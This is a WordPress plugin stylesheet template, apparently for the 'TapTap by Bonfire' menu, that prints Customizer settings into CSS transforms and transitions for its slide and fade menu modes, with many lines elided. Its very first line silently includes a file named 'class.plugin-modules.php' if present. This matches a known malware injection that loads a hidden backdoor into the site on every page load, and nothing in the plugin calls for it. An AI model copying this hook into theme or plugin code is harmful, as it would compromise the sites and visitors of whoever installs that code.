<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><!-- BEGIN CUSTOM COLORS (WP THEME CUSTOMIZER) -->
<style>
/**************************************************************
...
<?php break; case 'slideleft': ?>
    ...
    .taptap-background-image {
        ...
        -moz-transform:translateY(0) translateX(-<?php if(get_theme_mod('taptap_menu_width', '') !== '') { ?><?php echo get_theme_mod('taptap_menu_width'); ?>px<?php } else { ?>100%<?php } ?>) <?php if(get_theme_mod('taptap_menu_appearance_scaling_background', '') !== '') { ?>scale(<?php if(get_theme_mod('taptap_menu_appearance_scaling', '') !== '') { ?><?php echo get_theme_mod('taptap_menu_appearance_scaling'); ?><?php } else { ?>0.75<?php } ?>)<?php } ?>;
...
<?php break; case 'slideright': ?>
    ...
    .taptap-background-image {
        ...
        -moz-transform:translateY(0) translateX(100%) <?php if(get_theme_mod('taptap_menu_appearance_scaling_background', '') !== '') { ?>scale(<?php if(get_theme_mod('taptap_menu_appearance_scaling', '') !== '') { ?><?php echo get_theme_mod('taptap_menu_appearance_scaling'); ?><?php } else { ?>0.75<?php } ?>)<?php } ?>;
...
<?php break; case 'slidebottom': ?>
    ...
    .taptap-background-image {
        ...
        -moz-transform:translateY(100%) <?php if(get_theme_mod('taptap_menu_appearance_scaling_background', '') !== '') { ?>scale(<?php if(get_theme_mod('taptap_menu_appearance_scaling', '') !== '') { ?><?php echo get_theme_mod('taptap_menu_appearance_scaling'); ?><?php } else { ?>0.75<?php } ?>)<?php } ?>;
...
<?php break; case 'fade': ?>
    ...
    .taptap-background-image {
        ...
        -moz-transition:opacity <?php if(get_theme_mod('taptap_menu_appearance_speed', '') !== '') { ?><?php echo get_theme_mod('taptap_menu_appearance_speed'); ?><?php } else { ?>.5<?php } ?>s ease, top 0s ease <?php if(get_theme_mod('taptap_menu_appearance_speed', '') !== '') { ?><?php echo get_theme_mod('taptap_menu_appearance_speed'); ?><?php } else { ?>.5<?php } ?>s, transform <?php if(get_theme_mod('taptap_menu_appearance_speed', '') !== '') { ?><?php echo get_theme_mod('taptap_menu_appearance_speed'); ?><?php } else { ?>.5<?php } ?>s ease;
    ...
    .taptap-background-image-active {
        ...
        -moz-transition:opacity <?php if(get_theme_mod('taptap_menu_appearance_speed', '') !== '') { ?><?php echo get_theme_mod('taptap_menu_appearance_speed'); ?><?php } else { ?>.5<?php } ?>s ease, top 0s ease 0s, transform <?php if(get_theme_mod('taptap_menu_appearance_speed', '') !== '') { ?><?php echo get_theme_mod('taptap_menu_appearance_speed'); ?><?php } else { ?>.5<?php } ?>s ease;
    ...
    .taptap-background-image {
        ...
        -moz-transform:translateY(0) translateX(0) <?php if(get_theme_mod('taptap_menu_appearance_scaling_background', '') !== '') { ?>scale(<?php if(get_theme_mod('taptap_menu_appearance_scaling', '') !== '') { ?><?php echo get_theme_mod('taptap_menu_appearance_scaling'); ?><?php } else { ?>0.75<?php } ?>)<?php } ?>;
...
.taptap-by-bonfire-image > ul > li {
	...
	-moz-transform:translateY(<?php if(get_theme_mod('taptap_image_menu_animation_origin', '') !== '') { ?><?php echo get_theme_mod('taptap_image_menu_animation_origin'); ?><?php } else { ?>125<?php } ?>px);
...
.taptap-by-bonfire ul li {
	...
	-moz-transform:translateY(<?php if(get_theme_mod('taptap_menu_item_animation_origin', '') !== '') { ?><?php echo get_theme_mod('taptap_menu_item_animation_origin'); ?><?php } else { ?>50<?php } ?>px);
